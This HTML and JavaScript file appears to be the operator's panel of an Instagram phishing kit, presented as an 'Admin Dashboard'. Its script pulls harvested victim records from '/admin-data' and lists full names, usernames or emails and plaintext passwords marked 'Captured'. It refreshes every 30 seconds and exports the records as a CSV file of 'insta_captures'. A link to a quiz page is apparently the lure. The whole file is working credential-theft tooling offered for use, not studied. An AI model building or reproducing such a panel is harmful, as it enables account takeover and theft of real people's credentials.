<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard â€¢ Instagram</title>
    <link rel="icon" type="image/png" href="logo_final.png">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600&display=swap');

        :root {
            --bg-color: #050a0e;
            --card-bg: #0d161d;
            --border-color: #1e2d3d;
            --text-primary: #ffffff;
            --text-secondary: #8e96a0;
            --accent-color: #0095f6;
            --success-color: #00f2fe;
            --danger-color: #ff3b30;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Outfit', sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-primary);
            padding: 40px 20px;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 20px;
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo-section img {
            width: 30px;
            filter: brightness(0) invert(1);
        }

        .dashboard-title {
            font-size: 1.5rem;
            font-weight: 600;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 40px;
        }

        .stat-card {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            padding: 20px;
            border-radius: 12px;
            text-align: center;
        }

        .stat-value {
            font-size: 2rem;
            font-weight: 600;
            color: var(--accent-color);
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 0.8rem;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: var(--card-bg);
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        th {
            background: rgba(255, 255, 255, 0.03);
            text-align: left;
            padding: 18px;
            color: var(--text-secondary);
            font-size: 0.85rem;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 1px solid var(--border-color);
        }

        td {
            padding: 18px;
            border-bottom: 1px solid var(--border-color);
            font-size: 0.95rem;
        }

        tr:last-child td {
            border-bottom: none;
        }

        tr:hover td {
            background: rgba(255, 255, 255, 0.02);
        }

        .username {
            font-weight: 600;
            color: var(--accent-color);
        }

        .password {
            font-family: monospace;
            background: rgba(255, 255, 255, 0.05);
            padding: 4px 8px;
            border-radius: 4px;
            color: #ff9f0a;
        }

        .timestamp {
            font-size: 0.8rem;
            color: var(--text-secondary);
        }

        .badge {
            display: inline-block;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            background: rgba(0, 149, 246, 0.1);
            color: var(--accent-color);
        }

        .refresh-btn {
            background: var(--accent-color);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .refresh-btn:hover {
            opacity: 0.9;
        }

        .download-btn {
            background: transparent;
            color: var(--accent-color);
            border: 1px solid var(--accent-color);
            padding: 10px 20px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .download-btn:hover {
            background: var(--accent-color);
            color: white;
        }

        .btn-group {
            display: flex;
            gap: 10px;
        }

        @media (max-width: 600px) {
            table {
                display: block;
                overflow-x: auto;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <header>
            <div class="logo-section">
                <img src="logo_final.png" alt="Logo">
                <h1 class="dashboard-title">Admin Dashboard</h1>
            </div>
            <div class="btn-group">
                <button class="download-btn" onclick="location.href='admin_quiz.html'">Manage Quiz</button>
                <button class="download-btn" onclick="downloadCSV()">Download CSV</button>
                <button class="refresh-btn" onclick="fetchData()">Refresh Data</button>
            </div>
        </header>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="total-count">0</div>
                <div class="stat-label">Total Captures</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="last-capture">--</div>
                <div class="stat-label">Last Capture</div>
            </div>
        </div>

        <table>
            <thead>
                <tr>
                    <th>Full Name</th>
                    <th>Email / Username</th>
                    <th>Password</th>
                    <th>Time</th>
                    <th>Status</th>
                </tr>
            </thead>
            <tbody id="data-body">
                <!-- Data will be injected here -->
            </tbody>
        </table>
    </div>

    <script>
        async function fetchData() {
            try {
                const response = await fetch('/admin-data');
                const data = await response.json();

                const tableBody = document.getElementById('data-body');
                const totalCount = document.getElementById('total-count');
                const lastCapture = document.getElementById('last-capture');

                tableBody.innerHTML = '';
                totalCount.innerText = data.length;

                if (data.length > 0) {
                    // Since backend returns ORDER BY timestamp DESC, data[0] is the latest
                    const lastDate = new Date(data[0].timestamp);
                    lastCapture.innerText = lastDate.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
                }

                data.forEach(entry => {
                    const row = document.createElement('tr');
                    const date = new Date(entry.timestamp).toLocaleString();

                    row.innerHTML = `
                        <td>${entry.fullname || '<span style="color: grey">Not Provided</span>'}</td>
                        <td class="username">${entry.username}</td>
                        <td><span class="password">${entry.password}</span></td>
                        <td class="timestamp">${date}</td>
                        <td><span class="badge">Captured</span></td>
                    `;
                    tableBody.appendChild(row);
                });
            } catch (error) {
                console.error('Error fetching data:', error);
                alert('Session expired or server error.');
            }
        }

        async function downloadCSV() {
            try {
                const response = await fetch('/admin-data');
                const data = await response.json();

                if (data.length === 0) {
                    alert('No data to download');
                    return;
                }

                const headers = ['Full Name', 'Username/Email', 'Password', 'Timestamp'];
                const rows = data.map(entry => [
                    entry.fullname || 'Not Provided',
                    entry.username,
                    entry.password,
                    new Date(entry.timestamp).toLocaleString()
                ]);

                let csvContent = "data:text/csv;charset=utf-8,"
                    + headers.join(",") + "\n"
                    + rows.map(e => e.join(",")).join("\n");

                const encodedUri = encodeURI(csvContent);
                const link = document.createElement("a");
                link.setAttribute("href", encodedUri);
                link.setAttribute("download", `insta_captures_${new Date().toISOString().split('T')[0]}.csv`);
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            } catch (error) {
                console.error('Error downloading CSV:', error);
                alert('Failed to download CSV');
            }
        }

        // Initial fetch
        fetchData();

        // Auto refresh every 30 seconds
        setInterval(fetchData, 30000);
    </script>
</body>

</html>
